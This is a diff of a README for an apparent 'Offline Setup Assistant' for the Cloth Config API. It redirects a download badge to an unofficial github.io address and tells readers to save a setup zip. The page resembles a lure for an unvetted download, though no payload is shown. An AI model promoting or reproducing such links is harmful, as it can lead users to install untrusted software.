@@ -1,6 +1,6 @@
 # Cloth Config API — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](cloth-config-api-offline-setup.github.io)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](cloth-config-api-offline-setup.github.io/.github)
 
 ## ⚙️ How to Use
 1. Click the **Download** button above and save the `cloth-config-api-setup.zip` file.  
